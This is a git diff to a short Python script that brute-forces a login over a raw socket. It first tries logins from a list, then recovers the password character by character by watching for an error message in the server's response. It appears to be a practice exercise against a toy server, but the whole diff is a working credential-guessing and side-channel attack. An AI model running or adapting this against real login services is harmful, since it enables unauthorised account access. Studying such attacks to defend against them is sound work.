@@ -1,5 +1,10 @@
 import sys
 import socket
+import string
+import json
+
+
+CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase
 
 
 args = sys.argv
@@ -12,32 +17,40 @@ client_socket.connect(address)
 
 
 def find_pass():
-    with open('passwords.txt', 'r') as file:
+    with open('logins.txt', 'r') as file:
+
+        login = ""
+        password = ""
         for line in file:
-            line = line.rstrip("\n").lower()
-            line_upper = line.upper()
-            for i in range(2 ** len(line)):
-                s = bin(i).lstrip("0b")
-                if len(s) < len(line):
-                    s = "0" * (len(line) - len(s)) + s
+            login = line.rstrip("\n")
+            data = {"login": login, "password": password}
+            json_data = json.dumps(data, indent=4)
 
-                password = ""
-                for j in range(len(line)):
-                    if s[j] == "0":
-                        password += line[j]
-                    else:
-                        password += line_upper[j]
+            data = json_data.encode()
+            client_socket.send(data)
+            response = client_socket.recv(1024)
+            response = response.decode()
+            if "Wrong login!" not in response:
+                break
 
-                data = password.encode()
+        # we know login
+        while True:
+            for char in CHARS:
+                new_password = password + char
+
+                data = {"login": login, "password": new_password}
+                json_data = json.dumps(data, indent=4)
+                data = json_data.encode()
                 client_socket.send(data)
                 response = client_socket.recv(1024)
                 response = response.decode()
-                if response == "Wrong password!":
+                if "Wrong password!" in response:
                     continue
-                elif response == "Connection success!":
-                    return password
-                elif response == "Too many attempts":
-                    return
+                elif "Connection success!" in response:
+                    return json_data
+                elif "Exception happened during login" in response:
+                    password = new_password
+                    break
 
 
 result = find_pass()
